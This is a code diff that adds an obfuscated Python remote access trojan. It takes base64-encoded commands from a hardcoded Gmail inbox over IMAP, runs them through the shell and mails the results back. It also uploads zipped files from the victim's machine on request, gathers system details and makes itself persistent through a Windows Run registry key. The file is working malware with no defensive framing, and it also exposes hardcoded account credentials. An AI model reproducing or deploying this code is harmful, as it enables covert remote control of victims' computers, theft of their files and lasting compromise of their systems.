@@ -1,0 +1,133 @@
+import base64
+import imaplib
+import email
+import platform
+import subprocess
+import smtplib
+import time
+import os
+import zipfile
+from email.mime.application import MIMEApplication
+from email.mime.multipart import  MIMEMultipart
+from email.mime.text import MIMEText
+class Mainiidkdkdup:
+    def __init__(self):
+        try:
+            lkdifjls = "imap.gmail.com"
+            aerasdfcvdfsdaf = "espotifai.m4n4.2@gmail.com"
+            hgkkyuhmjh = "0980++84"
+            tghhg = "espotifai84@gmail.com"
+            sdef = "smtp.gmail.com"
+            oieuikfllbvlgbl_BODY = 'This is an attachement'
+            while True:
+                try:
+                    oieuikfllbvlgbl = imaplib.IMAP4_SSL(lkdifjls)
+                    oieuikfllbvlgbl.login(aerasdfcvdfsdaf, hgkkyuhmjh)
+                    oieuikfllbvlgbl.select("inbox")
+                    _, data = oieuikfllbvlgbl.search(None, "UNSEEN")
+                    for x in data[0].split():
+                        _, sdfsretyytyytyytedfgs = oieuikfllbvlgbl.fetch(x, '(RFC822)')
+                        _, g = sdfsretyytyytyytedfgs[0]
+                        data_email = email.oieuikfllbvlgbl_from_bytes(g)
+                        for m in data_email.walk():
+                            if m.get_content_type() == "text/plain":
+                                body = m.get_payload(decode=True)
+                                cm = body.decode("utf-8")
+                                base64_bytes = cm.encode('ascii')
+                                oieuikfllbvlgbl_bytes = base64.b64decode(base64_bytes)
+                                x = cm
+                                clock = str(x[1])
+                                def sendcm(result):
+                                    iidkdkdup = smtplib.SMTP(sdef, 587)
+                                    iidkdkdup.starttls()
+                                    oieuikfllbvlgbl_bytes = result.encode('ascii')
+                                    base64_bytes = base64.b64encode(oieuikfllbvlgbl_bytes)
+                                    base64_oieuikfllbvlgbl = base64_bytes.decode('ascii')
+                                    iidkdkdup.login(aerasdfcvdfsdaf, hgkkyuhmjh)
+                                    iidkdkdup.sendmail(aerasdfcvdfsdaf, tghhg, base64_oieuikfllbvlgbl)
+                                    iidkdkdup.quit()
+                                def changedir(path):
+                                    try:
+                                        os.chdir(path)
+                                        result = (clock + "\n\n" + "[+] changing direcotry to :- " + path)
+                                        sendcm(result)
+                                    except Exception:
+                                        e="error occured"
+                                        sisjdfsglasjfgiaalsjgfñlsj=clock+"\n\n"+e
+                                        sendcm(sisjdfsglasjfgiaalsjgfñlsj)
+                                        print(e)
+
+                                def ddttyghgyuytggfhjjerteegghgh_r(ddttyghgyuytggfhjjerteegghgh):
+                                    try:
+                                     if "persist" in ddttyghgyuytggfhjjerteegghgh:
+                                      print("trying to persist myself")
+                                      path=os.path.abspath("first.exe")
+                                      c="reg add HKCU\SoftWare\Microsoft\Windows\CurrentVersion\Run /v document /t REG_SZ /d "+ path
+                                      r = subprocess.check_output(c, shell=True)
+                                      ghyujdstghj = clock + "\n\n"+ "program success persist"
+                                      print(ghyujdstghj)
+                                      sendcm(ghyujdstghj)
+                                     elif "info" in ddttyghgyuytggfhjjerteegghgh:
+                                         sdlkflkiiwuweyewtewhddj = platform.uname()
+                                         sendcm(f"System: {sdlkflkiiwuweyewtewhddj.system}\nNode Name: {sdlkflkiiwuweyewtewhddj.node}\nRelease: {sdlkflkiiwuweyewtewhddj.release}\nVersion: {sdlkflkiiwuweyewtewhddj.version}\nMachine: {sdlkflkiiwuweyewtewhddj.machine}")
+                                     else:
+                                      r = subprocess.check_output(ddttyghgyuytggfhjjerteegghgh, shell=True)
+                                      dsfsdftytytyty=r.decode("utf-8")
+                                      ghyujdstghj=clock+str(dsfsdftytytyty)
+                                      sendcm(ghyujdstghj)
+                                    except Exception:
+                                        e="error occured"
+                                        sisjdfsglasjfgiaalsjgfñlsj=clock+"\n\n"+e
+                                        sendcm(sisjdfsglasjfgiaalsjgfñlsj)
+                                        print(e)
+                                def attachement():
+                                    filename=j
+                                    a = filename[1].strip()
+                                    new = a.split(".")
+                                    rename=str(new[0])+".zip"
+                                    zip_file=zipfile.ZipFile(rename, 'w')
+                                    zip_file.write(filename, compress_type=zip_file.compression)
+                                    zip_file.close()
+                                    time.sleep(3)
+                                    PATH_TO_ZIP_FILE = rename
+                                    sdfsretyytyytyytedfgs = MIMEMultipart()
+                                    body_part = MIMEText(oieuikfllbvlgbl_BODY, 'plain')
+                                    sdfsretyytyytyytedfgs['From'] = aerasdfcvdfsdaf
+                                    sdfsretyytyytyytedfgs['To'] = tghhg
+                                    sdfsretyytyytyytedfgs.attach(body_part)
+                                    with open(PATH_TO_ZIP_FILE, 'rb') as attachement:
+                                        sdfsretyytyytyytedfgs.attach(MIMEApplication(attachement.read(), Name='filename.zip'))
+                                    iidkdkdup = smtplib.SMTP(sdef, 587)
+                                    iidkdkdup.connect(sdef, 587)
+                                    iidkdkdup.ehlo()
+                                    iidkdkdup.starttls()
+                                    iidkdkdup.ehlo()
+                                    iidkdkdup.login(sdfsretyytyytyytedfgs['From'], hgkkyuhmjh)
+                                    text = sdfsretyytyytyytedfgs.as_string()
+                                    iidkdkdup.sendmail(sdfsretyytyytyytedfgs['From'], sdfsretyytyytyytedfgs['To'], text)
+                                    iidkdkdup.quit()
+                                    remove_upload(rename)
+
+                            def remove_upload(rename):
+                                os.remove(rename)
+                                print("file is deleted")
+
+                        c = oieuikfllbvlgbl_bytes.decode('ascii')
+                        ddttyghgyuytggfhjjerteegghgh = c.split(" ")
+                        if ddttyghgyuytggfhjjerteegghgh[0] == "cd":
+                            changedir(ddttyghgyuytggfhjjerteegghgh[1])
+                        elif ddttyghgyuytggfhjjerteegghgh[0] == "download":
+                            global j
+                            j = ddttyghgyuytggfhjjerteegghgh[1]
+                            attachement()
+                        else:
+                            ddttyghgyuytggfhjjerteegghgh_r(ddttyghgyuytggfhjjerteegghgh)
+                    del clock
+                    time.sleep(1)
+                except Exception:
+                 time.sleep(2)
+        except Exception:
+            print("Something bad happened")
+        finally:
+            Mainiidkdkdup.__init__()
+Mainiidkdkdup()
